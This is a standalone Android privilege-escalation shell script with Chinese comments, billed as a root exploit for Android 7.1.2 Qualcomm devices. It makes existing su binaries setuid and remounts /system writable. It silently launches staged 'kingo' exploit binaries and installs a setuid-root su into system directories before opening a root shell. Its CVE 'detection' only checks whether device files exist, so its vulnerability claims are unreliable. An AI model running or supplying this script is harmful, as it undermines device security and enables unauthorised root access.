#!/system/bin/sh
# standalone_root.sh - 独立Root脚本
# 使用: adb shell "sh /sdcard/standalone_root.sh"
# 或: adb shell < standalone_root.sh

set -e

echo "[========================================]"
echo "[*] Android Root Exploit - v1.0"
echo "[*] 目标: Android 7.1.2 + Qualcomm"
echo "[========================================]"

# 变量
TMPDIR="/data/local/tmp"
WORKDIR="$TMPDIR/.root_$$"
LOG="$TMPDIR/root_log.txt"

# 初始化
mkdir -p "$WORKDIR"
cd "$WORKDIR"
echo "" > "$LOG"

log() {
    echo "$1"
    echo "$1" >> "$LOG"
}

# 检查root
check_root() {
    if [ "$(id -u)" = "0" ]; then
        return 0
    fi
    return 1
}

if check_root; then
    log "[✓] 已具备root权限!"
    exec /system/bin/sh
fi

# 获取架构
ARCH=$(getprop ro.product.cpu.abi 2>/dev/null || uname -m)
log "[*] 架构: $ARCH"

# SELinux
SELINUX=$(getenforce 2>/dev/null || echo "Permissive")
log "[*] SELinux: $SELINUX"

# ========== 方法1: 检查su ==========
log ""
log "[方法1] 检查系统su..."
for p in /system/xbin/su /system/bin/su /sbin/su; do
    if [ -f "$p" ]; then
        log "[*] 发现: $p"
        chmod 6755 "$p" 2>/dev/null
    fi
done

# ========== 方法2: remount ==========
log ""
log "[方法2] remount /system..."
mount -o rw,remount /system 2>&1 | tee -a "$LOG"
if mount | grep -q "/system.*rw"; then
    log "[✓] remount 成功"
fi

# ========== 方法3: 检查exploit二进制 ==========
log ""
log "[方法3] 检查exploit..."

if [ -f "$TMPDIR/kingo_ac64" ]; then
    log "[*] 运行 kingo_ac64..."
    chmod 755 "$TMPDIR/kingo_ac64"
    nohup "$TMPDIR/kingo_ac64" >/dev/null 2>&1 &
    sleep 2
fi

if [ -f "$TMPDIR/kingo_ac" ]; then
    log "[*] 运行 kingo_ac..."
    chmod 755 "$TMPDIR/kingo_ac"
    nohup "$TMPDIR/kingo_ac" >/dev/null 2>&1 &
    sleep 2
fi

if check_root; then
    log "[✓] Exploit成功!"
fi

# ========== 方法4: 创建临时su ==========
log ""
log "[方法4] 检查临时su..."

if [ -f "$TMPDIR/su" ]; then
    log "[*] 复制su到system..."
    cp "$TMPDIR/su" /system/xbin/su 2>/dev/null || true
    cp "$TMPDIR/su" /system/bin/su 2>/dev/null || true
    chmod 6755 /system/xbin/su 2>/dev/null || true
    chmod 6755 /system/bin/su 2>/dev/null || true
    chown root:root /system/xbin/su 2>/dev/null || true
    chown root:root /system/bin/su 2>/dev/null || true
    log "[✓] su已安装"
fi

# ========== 方法5: CVE漏洞检测 ==========
log ""
log "[方法5] CVE漏洞检测..."

# CVE-2026-21385 - Qualcomm GPU
if [ -e "/dev/mdss_fb0" ] || [ -e "/dev/graphics/fb0" ]; then
    log "[*] CVE-2026-21385: Qualcomm GPU 可能存在"
else
    log "[*] CVE-2026-21385: 非Qualcomm设备"
fi

# CVE-2026-31431 - Kernel crypto
if [ -e "/dev/af_alg" ] || grep -q "algif_aead" /proc/crypto 2>/dev/null; then
    log "[*] CVE-2026-31431: kernel crypto 可能存在"
else
    log "[*] CVE-2026-31431: 不确定"
fi

# ========== 结果 ==========
log ""
log "[*] 最终状态:"
id >> "$LOG"

if check_root; then
    log ""
    log "╔══════════════════════════════════╗"
    log "║     ROOT 获 取 成 功!           ║"
    log "╚══════════════════════════════════╝"
    log ""
    log "[*] 输入 'exit' 退出root shell"
    log ""
    exec /system/bin/sh
else
    log ""
    log "╔══════════════════════════════════╗"
    log "║     ROOT 获 取 失 败            ║"
    log "╚══════════════════════════════════╝"
    log ""
    log "[*] 提示:"
    log "    1. 确保设备已root过或漏洞存在"
    log "    2. 手动运行: sh $WORKDIR/exploit.sh"
    log "    3. 或复制su到: /data/local/tmp/su"
fi

# 清理
cd /
rm -rf "$WORKDIR"
